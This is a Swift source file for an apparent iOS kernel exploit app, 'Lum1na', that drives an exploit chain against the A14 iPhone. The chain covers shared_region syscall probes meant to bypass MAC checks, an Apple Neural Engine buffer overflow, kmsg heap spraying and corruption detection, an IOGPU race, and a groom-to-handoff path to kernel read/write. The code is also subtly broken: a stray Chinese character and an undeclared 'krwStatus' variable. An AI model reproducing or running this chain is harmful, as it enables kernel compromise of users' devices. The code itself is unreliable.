//
//  Lum1naViewModel.swift
//  Lum1na
//
//  Central state + orchestration. Wired to:
//    - Lum1naLogBridge (ObjC console bridge, tag-based logging)
//    - P044ExploitController / ANE254InputController (groom → handoff → KRW)
//    - ANEDirectIn (P059, direct ANE selector 2, bypasses CoreML x_189 wall)
//    - P022 shared_region probes (syscall 536, sf_fd=-1 MAC bypass)
//    - P060 kmsg 3072 Shape-O oracle
//    - IOGPU64788Controller (P061)
//
//  Target: iPhone13,2 (A14) — iOS 23F77 ONLY. Never mix offsets.
//

import SwiftUI
import Combine
import Darwin
import IOSurface
import IOKit

// MARK: - Shared Types

enum StageStatus: Equatable {
    case notRun
    case running
    case ok
    case fail(errno: Int32, kr: Int32)

    var displayText: String {
        switch self {
        case .notRun:  return "NOT RUN"
        case .running: return "RUNNING"
        case .ok:      return "OK"
        case .fail:    return "FAIL"
        }
    }

    var chipColor: Color {
        switch self {
        case .notRun:  return .gray
        case .running: return .blue
        case .ok:      return .green
        case .fail:    return .red
        }
    }
}

enum ChainState: Equatable {
    case pending, running, complete, failed

    var icon: String {
        switch self {
        case .pending:  return "circle"
        case .running:  return "arrow.triangle.2.circlepath"
        case .complete: return "checkmark.circle.fill"
        case .failed:   return "xmark.circle.fill"
        }
    }

    var color: Color {
        switch self {
        case .pending:  return .gray
        case .running:  return .blue
        case .complete: return .green
        case .failed:   return .red
        }
    }
}

struct P022ProbeResult: Identifiable, Equatable {
    let id = UUID()
    let name: String          // "A" / "B" / "C"
    let detail: String
    let ret: Int              // syscall return (0 = SUCCESS = MAC BYPASS)
    let errnoValue: Int32

    var succeeded: Bool { ret == 0 }
}

struct HeapLeak: Identifiable, Equatable, Codable {
    var id: UUID = UUID()
    let va: String      // hex string, e.g. "0xffffffe632284b80"
    let source: String  // e.g. "aio84530"
    let kind: String    // e.g. "heap"

    enum CodingKeys: String, CodingKey { case va, source, kind }
}

struct Lum1naBoard: Codable, Equatable {
    var hasKread: Bool = false
    var hasKwrite: Bool = false
    var kslide: UInt64 = 0
    var kbase: UInt64 = 0
    var heapLeaks: [HeapLeak] = []

    enum CodingKeys: String, CodingKey {
        case hasKread, hasKwrite, kslide, kbase, heapLeaks = "leaks"
    }

    init() {}
    init(from decoder: Decoder) throws {
        let c = try decoder.container(keyedBy: CodingKeys.self)
        hasKread   = try c.decodeIfPresent(Bool.self, forKey: .hasKread) ?? false
        hasKwrite  = try c.decodeIfPresent(Bool.self, forKey: .hasKwrite) ?? false
        let slideS = try c.decodeIfPresent(String.self, forKey: .kslide) ?? "0x0"
        let baseS  = try c.decodeIfPresent(String.self, forKey: .kbase) ?? "0x0"
        kslide = UInt64(slideS.dropFirst(2), radix: 16) ?? 0
        kbase  = UInt64(baseS.dropFirst(2), radix: 16) ?? 0
        heapLeaks = try c.decodeIfPresent([HeapLeak].self, forKey: .heapLeaks) ?? []
    }
}

enum KRWState: Equatable {
    case pending
    case scanningPairs(count: Int)
    case established(kslide: UInt64, kbase: UInt64)
    case failed(reason: String)
}

struct LogEntry: Identifiable, Equatable {
    let id = UUID()
    let timestamp: Date
    let tag: String
    let message: String

    var color: Color {
        if tag.hasPrefix("P0") { return .blue }          // [P0xx] probe tags
        switch tag {
        case "+":  return .green
        case "-":  return .red
        case "!":  return .yellow
        case "*":  return .blue
        default:   return .secondary
        }
    }

    var timestampText: String {
        let f = DateFormatter()
        f.dateFormat = "HH:mm:ss"
        return f.string(from: timestamp)
    }
}

// MARK: - P022 shared_region Swift probes (syscall 536)
//
// Probe A: sf_fd = -1, all-NO_REBASE slide_info  → if ret == 0, MAC mmap bypassed
// Probe B: real cache fd control                 → expect errno (validates the wall)
// Probe C: prot sweep with sf_fd = -1            → RX/RW/RWX/RO/X/NONE
//
// NOTE: verify sf_mapping layout against your P022 v37 notes before trusting
// probe results beyond the errno oracle. errno is the ground truth either way.

enum P022SharedRegionProbes {

    // 5 x u32 mapping record; all zeros = NO_REBASE. VERIFY against v37 notes.
    static let mappingRecordWords = 5
    static let mappingCount = 1

    static func probeA() -> P022ProbeResult {
        var fbuf = [UInt32](repeating: 0, count: 0x400)
        fbuf[0] = UInt32(bitPattern: Int32(-1))   // sf_fd = -1 → skip fp_lookup
        fbuf[1] = UInt32(mappingCount)            // sf_mappings = 1
        var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)

        let ret = fbuf.withUnsafeMutableBufferPointer { fb in
            mappings.withUnsafeMutableBufferPointer { mp in
                syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
            }
        }
        return P022ProbeResult(name: "A", detail: "sf_fd=-1, all-NO_REBASE",
                               ret: Int(ret), errnoValue: errno)
    }

    static func probeB() -> P022ProbeResult {
        let paths = [
            "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
            "/System/Library/dyld/dyld_shared_cache_arm64e"
        ]
        var fd: Int32 = -1
        for p in paths {
            fd = open(p, O_RDONLY)
            if fd >= 0 { break }
        }
        guard fd >= 0 else {
            return P022ProbeResult(name: "B", detail: "real-fd control (no cache fd)",
                                   ret: -1, errnoValue: ENOENT)
        }
        defer { close(fd) }

        var fbuf = [UInt32](repeating: 0, count: 0x400)
        fbuf[0] = UInt32(fd)                      // real fd → expect MAC deny
        fbuf[1] = UInt32(mappingCount)
        var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)

        let ret = fbuf.withUnsafeMutableBufferPointer { fb in
            mappings.withUnsafeMutableBufferPointer { mp in
                syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
            }
        }
        return P022ProbeResult(name: "B", detail: "real-fd control (expect deny)",
                               ret: Int(ret), errnoValue: errno)
    }

    static func probeC() -> [P022ProbeResult] {
        let prots: [(String, UInt32)] = [
            ("RO", 1), ("W", 2), ("RW", 3), ("X", 4), ("RX", 5), ("RWX", 7)
        ]
        return prots.map { prot in
            var fbuf = [UInt32](repeating: 0, count: 0x400)
            fbuf[0] = UInt32(bitPattern: Int32(-1))
            fbuf[1] = UInt32(mappingCount)
            var mappings = [UInt32](repeating: 0, count: mappingRecordWords * mappingCount)
            mappings[3] = prot.1   // prot word — verify position against v37

            let ret = fbuf.withUnsafeMutableBufferPointer { fb in
                mappings.withUnsafeMutableBufferPointer { mp in
                    syscall(536, 1, fb.baseAddress!, 1, mp.baseAddress!, 0, 0, 0, 0)
                }
            }
            return P022ProbeResult(name: "C", detail: "sf_fd=-1 prot=\(prot.0)",
                                   ret: Int(ret), errnoValue: errno)
        }
    }
}

// MARK: - View Model

@MainActor
final class Lum1naViewModel: ObservableObject {

    // MARK: Board (Lum1naBoard JSON state)
    @Published var board = Lum1naBoard()

    // MARK: Stage statuses
    @Published var p044Status: StageStatus = .notRun
    @Published var p022Status: StageStatus = .notRun
    @Published var p022ProbeResults: [P022ProbeResult] = []
    @Published var aneDirectInStatus: StageStatus = .notRun      // P059
    @Published var kmsgOracleStatus: StageStatus = .notRun       // P060
    @Published var p061Status: StageStatus = .notRun             // IOGPU 64788

    // MARK: Chain / KRW
    @Published var groomedPairCount = 0
    @Published var corruptedPairCount = 0
    @Published var krwState: KRWState = .pending
    @Published var groomState: ChainState = .pending
    @Published var aneFireState: ChainState = .pending
    @Published var pairScanState: ChainState = .pending
    @Published var krwChainState: ChainState = .pending

    // MARK: Console
    @Published var consoleLogs: [LogEntry] = []
    @Published var activeStrategy: ExploitStageSelector.Strategy = .aneChain

    // Set at app init to also forward logs into the ObjC bridge if wanted.
    var externalLogSink: ((String, String) -> Void)?

    private var cancellables = Set<AnyCancellable>()

    // MARK: Computed
    var isKernelLeakDetected: Bool { board.kslide != 0 || board.kbase != 0 }
    var hasKRW: Bool { board.hasKread && board.hasKwrite }

    // MARK: Init
    init() {
        log("*", "Lum1na view model online — target A14 23F77")
    }

    // MARK: Logging (matches console tag scheme: P0xx / * / + / - / !)
    func log(_ tag: String, _ message: String) {
        let entry = LogEntry(timestamp: Date(), tag: tag, message: message)
        consoleLogs.append(entry)
        if consoleLogs.count > 2000 { consoleLogs.removeFirst(consoleLogs.count - 2000) }
        externalLogSink?(tag, message)
    }
    func logInfo(_ m: String)    { log("*", m) }
    func logSuccess(_ m: String) { log("+", m) }
    func logError(_ m: String)   { log("-", m) }
    func logWarn(_ m: String)    { log("!", m) }

    func clearLogs() { consoleLogs.removeAll() }

    // MARK: Board ingestion (paste Lum1naBoard JSON dump here)
    func updateBoard(fromJSON data: Data) {
        do {
            let decoded = try JSONDecoder().decode(Lum1naBoard.self, from: data)
            board = decoded
            log("*", String(format: "Board updated: kslide=0x%llx kbase=0x%llx kread=%d kwrite=%d leaks=%d",
                            board.kslide, board.kbase, board.hasKread ? 1 : 0,
                            board.hasKwrite ? 1 : 0, board.heapLeaks.count))
        } catch {
            logError("Board JSON decode failed: \(error.localizedDescription)")
        }
    }

    // MARK: P044 → ANE254 handoff bookkeeping
    func integrateP044Results(groomedPairs: Int) {
        groomedPairCount = groomedPairs
        groomState = groomedPairs > 0 ? .complete : .failed
        logSuccess("Copied \(groomedPairs) groomed pairs from P044")
        if groomedPairs > 0 {
            pairScanState = .running
            krwState = .scanningPairs(count: groomedPairs)
        }
    }

    // MARK: - P022 Probes
    func runP022Probes() {
        guard p022Status != .running else { return }
        p022Status = .running
        p022ProbeResults.removeAll()
        log("P022", "shared_region syscall 536 — running probes A/B/C")

        let a = P022SharedRegionProbes.probeA()
        p022ProbeResults.append(a)
        log(a.succeeded ? "+" : "-", "P022 Probe A (\(a.detail)): ret=\(a.ret) errno=\(a.errnoValue)")
        if a.succeeded {
            logSuccess("P022 Probe A ret=0 — MAC mmap BYPASSED — direct KRW path live")
        }

        let b = P022SharedRegionProbes.probeB()
        p022ProbeResults.append(b)
        log(b.ret != 0 ? "*" : "!", "P022 Probe B (\(b.detail)): ret=\(b.ret) errno=\(b.errnoValue) (nonzero expected — validates the wall)")

        let cResults = P022SharedRegionProbes.probeC()
        for c in cResults {
            p022ProbeResults.append(c)
            log(c.succeeded ? "+" : "-", "P022 Probe C (\(c.detail)): ret=\(c.ret) errno=\(c.errnoValue)")
        }

        let anySuccess = p022ProbeResults.contains { $0.succeeded }
        p022Status = anySuccess ? .ok
            : .fail(errno: p022ProbeResults.first?.errnoValue ?? 0, kr: 0)
        if anySuccess {
            logSuccess("P022: at least one probe returned 0 — elevate to KRW workstream")
        } else {
            logError("P022: all probes returned errno — sf_fd=-1 path appears walled on 23F77")
        }
    }

    // MARK: - P059 ANEDirectIn
    // Requires bridging header: #import "ANEDirectIn.h"
    func runANEDirectIn() {
        guard aneDirectInStatus != .running else { return }
        aneDirectInStatus = .running
        log("P059", "ANEDirectIn — direct ANE selector 2, bypassing CoreML x_189 wall")

        let direct = ANEDirectIn.sharedDirectIn()
        var err: NSError?
        let kr = direct.openDeviceWithError(&err)
        guard kr == KERN_SUCCESS else {
            aneDirectInStatus = .fail(errno: 0, kr: Int32(kr))
            logError(String(format: "P059 openDevice failed: kr=0x%x %@", kr, err?.localizedDescription ?? ""))
            return
        }
        logSuccess("P059 AppleH11ANEInterface opened (type 1)")

        // 255 surfaces: 254 input + 1 output
        guard let surfaces = direct.createTriggerSurfacesWithCount(255, error: &err) as? [IOSurfaceRef] else {
            aneDirectInStatus = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P059 surface creation failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        log("*", "P059 created \(surfaces.count) IOSurfaces (64x64x4)")

        let ids = surfaces.map { IOSurfaceGetID($0) }
        guard let baseID = ids.first, baseID != 0 else {
            aneDirectInStatus = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P059 IOSurfaceGetID returned 0 — surfaces not usable")
            return
        }

        var request = H11ANEProgramRequestArgsStruct()
        buildOverflowRequest(&request, 0x1, baseID)   // 254 inputs → 0x3E0 OOB
        log("*", String(format: "P059 request built: inputs=%u (0x3E0 OOB expected)",
                        request.total_InputBuffers))

        var asyncPort: mach_port_t = 0
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &asyncPort)
        defer { mach_port_destroy(mach_task_self(), asyncPort) }

        let sendKr = direct.sendProgramRequest(&request, asyncPort: asyncPort)
        log(String(format: "P059 ProgramSendRequest kr=0x%x", sendKr),
            sendKr == KERN_SUCCESS ? "overflow request accepted — check oracle/board"
                                   : "driver rejected request — verify struct layout offsets")

        aneDirectInStatus = (sendKr == KERN_SUCCESS) ? .ok : .fail(errno: 0, kr: Int32(sendKr))
        aneFireState = (sendKr == KERN_SUCCESS) ? .complete : .failed
    }

    // MARK: - P060 kmsg 3072 Shape-O Oracle
    // Spray kmsg bodies (~3072) → ANE fire → receive → look for {sid, sym, 1, dir}
    // overwriting our 0xAA marker in the first 16 bytes.
    func runKmsgOracle() {
        guard kmsgOracleStatus != .running else { return }
        kmsgOracleStatus = .running
        corruptedPairCount = 0
        log("P060", "kmsg 3072 Shape-O oracle starting (L/R/C/S/F rejected on 23F77)")

        let sprayCount = 64
        let bodySize = 3072
        let marker: UInt8 = 0xAA

        // 1. Spray: receive-right per port, big inline message
        var ports: [mach_port_t] = []
        var buffers: [UnsafeMutableRawPointer] = []
        for _ in 0..<sprayCount {
            var p: mach_port_t = 0
            guard mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS else { continue }
            let msgSize = UInt32(MemoryLayout<mach_msg_header_t>.size + bodySize + 64)
            let buf = UnsafeMutableRawPointer.allocate(byteCount: Int(msgSize), alignment: 8)
            buf.initializeMemory(as: UInt8.self, repeating: 0, count: Int(msgSize))
            let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
            hdr.pointee.msgh_bits = UInt32(MACH_MSG_TYPE_MAKE_SEND)
            hdr.pointee.msgh_size = msgSize
            hdr.pointee.msgh_remote_port = p
            hdr.pointee.msgh_local_port = 0
            hdr.pointee.msgh_id = 0x1234
            // body marker
            let body = buf.advanced(by: MemoryLayout<mach_msg_header_t>.size)
                .assumingMemoryBound(to: UInt8.self)
            for i in 0..<bodySize { body[i] = marker }
            let kr = mach_msg(hdr, MACH_SEND_MSG, msgSize, 0, 0, 0, 0)
            if kr == KERN_SUCCESS {
                ports.append(p)
                buffers.append(buf)
            } else {
                buf.deallocate()
            }
        }
        log("*", "P060 sprayed \(ports.count) kmsg bodies @ \(bodySize)B")

        // 2. Fire ANE overflow (reuse P059 trigger path, no device reopen spam)
        runANEDirectIn()

        // 3. Receive + scan first 16 bytes
        var corrupted = 0
        for (idx, p) in ports.enumerated() {
            let buf = buffers[idx]
            let hdr = buf.assumingMemoryBound(to: mach_msg_header_t.self)
            hdr.pointee.msgh_local_port = p
            hdr.pointee.msgh_bits = 0
            let kr = mach_msg(hdr, MACH_RCV_MSG, 0, hdr.pointee.msgh_size, p,
                              UInt32(500 /*ms*/), 0)
            guard kr == KERN_SUCCESS else { continue }
            let body = buf.advanced(by: MemoryLayout<mach_msg_header_t>.size)
                .assumingMemoryBound(to: UInt8.self)
            var touched = false
            for i in 0..<16 where body[i] != marker { touched = true; break }
            if touched {
                corrupted += 1
                let hex = (0..<16).map { String(format: "%02x", body[$0]) }.joined()
                logSuccess("P060 pair \(idx) CORRUPTED — first 16B: \(hex)")
            }
        }
        for b in buffers { b.deallocate() }

        corruptedPairCount = corrupted
        if corrupted > 0 {
            kmsgOracleStatus = .ok
            logSuccess("P060 oracle: \(corrupted)/\(ports.count) neighbors corrupted — 43748 lands confirmed")
        } else {
            kmsgOracleStatus = .fail(errno: ENOENT, kr: 0)
            logError("P060 oracle: no corruption signature — overflow did not land in sprayed 3072 chunks")
        }
    }

    // MARK: - P061 IOGPU 64788
    // Requires bridging header: #import "IOGPU64788Controller.h"
    func runP061(iterations: UInt32 = 64) {
        guard p061Status != .running else { return }
        p061Status = .running
        log("P061", "IOGPU 64788 race — priming depot")

        let c = IOGPU64788Controller.sharedController()
        var err: NSError?
        // slide unknown until an earlier stage leaks it; drive with slide 0 for
        // driver-reach oracle only. Do NOT trust addresses when slide==0.
        if !c.initializeWithKernelSlide(0, error: &err) {
            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P061 init failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        guard c.primeDepotWithError(&err) else {
            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P061 primeDepot failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        logSuccess("P061 resource created — arming race")
        guard c.armRaceWithError(&err) else {
            p061Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P061 armRace failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        c.fire(withIterations: iterations, error: &err)

        let d = c.raceDiagnostics() ?? [:]
        let wins = (d["reclaimWins"] as? NSNumber)?.uintValue ?? 0
        let pacs = (d["pacFailures"] as? NSNumber)?.uintValue ?? 0
        log("*", String(format: "P061 fired %u iters — reclaimWins=%u pacFailures=%u",
                        iterations, wins, pacs))
        p061Status = (wins > 0 || pacs > 0) ? .ok : .fail(errno: 0, kr: 0)
        if wins > 0 { logSuccess("P061 reclaim wins detected — escalate to setAllocation dispatch") }
伟    }

    // MARK: - Full P044 chain (groom → integrate → KRW)
    // Requires bridging header entries for P044ExploitController / ANE254InputController.
    func runP044Chain() {
        guard p044Status != .running else { return }
        p044Status = .running
        groomState = .running
        log("P044", "hole-victim chain: spray → free holes → ANE fire → scan")

        let p044 = P044ExploitController()
        var err: NSError?
        guard p044.prepareWithError(&err) else {
            p044Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("P044 prepare failed: \(err?.localizedDescription ?? "unknown")")
            return
        }
        p044.execute()
        let pairs = p044.groomedPairs?.count ?? 0
        integrateP044Results(groomedPairs: pairs)
        logSuccess("P044 groom complete — \(pairs) pairs")

        let ane = ANE254InputController()
        if ane.integrateP044Results(p044, error: &err) {
            logSuccess("ANE254 handoff complete (ports ref-counted, P044 cleanup skipped)")
            p044.shouldSkipPortCleanup = true
            krwState = .scanningPairs(count: pairs)
            let krwOK = ane.establishKRWWithError(&err)
            if krwOK {
                krwStatus = .ok
                krwState = .established(kslide: board.kslide, kbase: board.kbase)
                pairScanState = .complete
                krwChainState = .complete
                logSuccess("KRW established — board will reflect kslide/kbase")
            } else {
                krwStatus = .fail(errno: 0, kr: KERN_FAILURE)
                krwState = .failed(reason: err?.localizedDescription ?? "no corrupted pairs")
                pairScanState = .failed
                logError("KRW failed: \(err?.localizedDescription ?? "unknown")")
            }
        } else {
            p044Status = .fail(errno: 0, kr: KERN_FAILURE)
            logError("ANE254 handoff failed: \(err?.localizedDescription ?? "unknown")")
        }
    }
}
